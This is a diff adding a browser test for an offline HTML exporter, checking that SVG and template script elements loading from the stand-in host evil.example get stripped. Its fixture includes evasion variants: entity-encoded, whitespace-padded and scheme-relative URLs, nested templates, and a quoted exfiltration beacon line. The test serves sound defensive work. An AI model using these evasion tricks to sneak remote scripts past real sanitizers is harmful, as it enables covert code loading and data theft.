@@ -2133,6 +2133,115 @@ test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips b
   }
 });
 
+// An SVG <script> does not load through `src`: it uses `href` (SVG2) or the legacy `xlink:href`,
+// and its body is EMPTY - so the loader strip's `script[src]` selector never saw it and the inline
+// egress scan (which reads `textContent`) had nothing to read. Such a script survived into a file
+// that promises zero network, with the CSP left as the only thing between it and the fetch (#881).
+const SVG_SCRIPT_HREF_CONTENT = [
+  "<h1>SVG script loaders</h1>",
+  '<p id="svg-note">An SVG script loads through href, not src.</p>',
+  '<svg width="10" height="10" aria-hidden="true">',
+  // A decoy that also borrows a reserved layer id: neutralizing it into inert data does not save
+  // it, because a remote LOAD is exactly what this strip exists to take away (the same rule the
+  // `src` decoy pins).
+  '  <script id="reviewedSections" href="https://evil.example/svg-href-decoy.js">/* cmh-svg-href-decoy */</script>',
+  '  <script xlink:href="https://evil.example/svg-xlink-decoy.js">/* cmh-svg-xlink-decoy */</script>',
+  '  <script href="//evil.example/svg-scheme-relative-decoy.js">/* cmh-svg-scheme-relative-decoy */</script>',
+  // Two load attributes on ONE element: it must be removed, and counted, exactly once.
+  '  <script href="https://evil.example/svg-both-a.js" xlink:href="https://evil.example/svg-both-b.js">/* cmh-svg-both-decoy */</script>',
+  // ...and no further: a relative or data reference loads nothing over the network, so widening the
+  // attribute set must not start deleting it.
+  '  <script href="svg-local-keep.js">/* cmh-svg-relative-keep */</script>',
+  '  <script xlink:href="data:text/javascript,void%200">/* cmh-svg-data-keep */</script>',
+  // A browser removes leading C0 controls and spaces before it parses a URL, so a padded value is a
+  // real load - and this exercises the runtime predicate end to end rather than through the constant
+  // the parity test extracts.
+  '  <script href=" \thttps://evil.example/svg-padded-decoy.js">/* cmh-svg-padded-decoy */</script>',
+  // Character references are decoded by the parser, so the strip reads `//evil...` from the DOM -
+  // this pins the getAttribute-to-predicate pipeline, not just the regex.
+  '  <script xlink:href="&#x2f;&#x2f;evil.example/svg-entity-decoy.js">/* cmh-svg-entity-decoy */</script>',
+  "</svg>",
+  // A <template>'s children live in an inert content fragment that `querySelectorAll` cannot see,
+  // while the validator's flat tokenizer reads the tags plainly - so this used to ride into the
+  // export and then be REJECTED by the exporter's own --strict gate. Templates nest, so one decoy
+  // sits a level deeper: a single-level walk would leave it behind.
+  '<template><svg><script href="https://evil.example/template-decoy.js">/* cmh-template-decoy */</script></svg>'
+  + '<template><svg><script xlink:href="https://evil.example/nested-template-decoy.js">/* cmh-nested-template-decoy */</script></svg></template></template>',
+  // The same attributes are INERT on an HTML script - they fetch nothing, in HTML or in XHTML - so
+  // deleting the element would destroy running author code over a dead attribute. The load is taken
+  // away by removing the attribute alone, which also leaves the validator (whose flat tokenizer
+  // reads all three attributes on every script) nothing to complain about.
+  '<script href="https://evil.example/html-ns-decoy.js">/* cmh-html-href-keep */</script>',
+].join("\n");
+
+test("CMH-OFFLINE-04: an SVG script that loads through href or xlink:href is stripped like one with src", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(SVG_SCRIPT_HREF_CONTENT, { key: "cmh-offline-svg-script-href", source: "offline-svg-script-href.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    for (const marker of ["cmh-svg-href-decoy", "cmh-svg-xlink-decoy", "cmh-svg-scheme-relative-decoy",
+      "cmh-svg-both-decoy", "cmh-svg-padded-decoy", "cmh-svg-entity-decoy", "cmh-template-decoy",
+      "cmh-nested-template-decoy"]) {
+      expect(exportedHtml, `${marker} loads over the network and must be removed`).not.toContain(marker);
+    }
+    for (const target of ["evil.example/svg-href-decoy.js", "evil.example/svg-xlink-decoy.js",
+      "evil.example/svg-scheme-relative-decoy.js", "evil.example/svg-both-a.js",
+      "evil.example/svg-both-b.js", "evil.example/svg-padded-decoy.js",
+      "evil.example/svg-entity-decoy.js", "evil.example/template-decoy.js",
+      "evil.example/nested-template-decoy.js", "evil.example/html-ns-decoy.js"]) {
+      expect(exportedHtml, `${target} must not survive`).not.toContain(target);
+    }
+    // An HTML script's `href` is inert, so the load is taken away without taking the author's code
+    // with it: the element stays, the attribute does not.
+    expect(exportedHtml, "an inert href must not cost the author their script").toContain("cmh-html-href-keep");
+    // The controls must survive INTACT: keeping the element while silently dropping the reference
+    // would be the same content loss in a quieter form.
+    expect(exportedHtml, "a relative SVG script reference is not a network load").toContain("cmh-svg-relative-keep");
+    expect(exportedHtml, "a data SVG script reference is not a network load").toContain("cmh-svg-data-keep");
+    expect(exportedHtml).toContain('href="svg-local-keep.js"');
+    expect(exportedHtml).toContain('xlink:href="data:text/javascript,void%200"');
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+    // Removing a script is content loss, so it is named rather than silent - and the element
+    // carrying TWO network attributes is counted once, not twice.
+    await expect(page.locator("#toast")).toContainText("8 scripts that load or navigate to the network were removed.");
+
+    const exportedPath = path.join(outDir, "offline-svg-script-href.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict
+    // too. (The reserved id is DUPLICATED by the decoy in the source document, which is the source
+    // document's own pre-existing invalidity - but the decoy carrying it is removed here, so the
+    // exported file has one of each again and validates outright.)
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
   + 'location.href = "https://evil.example/steal" beacon before we ship this.';
 
